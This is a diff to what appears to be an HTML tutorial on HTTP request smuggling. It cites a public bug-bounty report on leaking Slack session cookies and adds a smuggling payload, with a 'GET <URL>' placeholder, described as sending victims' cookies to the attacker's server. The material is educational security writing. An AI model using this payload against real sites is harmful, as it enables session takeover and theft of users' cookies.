@@ -195,7 +195,19 @@ receive a connection from a different IP that you have (best scenario).</p>
 able to steal the cookies, achieving massive Session Takeover, yay!</p>
 <p>A good example of this scenario is shown in this amazing report: <a href="https://hackerone.com/reports/737140">#737140</a> where @defparam was
 able to leak the session cookie, leading to mass session takeover of the users affected.</p>
+
+The payload tries to smuggle a simple GET request to his server, which will contain all the cookies of the victims :)
           
+          <pre><code>
+Host: slackb.com
+User-Agent: Smuggler/v1.0
+Content-Length: 83
+
+0
+
+GET <URL> HTTP/1.1
+X: X
+</pre></code>
 <h3 id="conclusion">Where to practice?</h3>
 <ul>
 
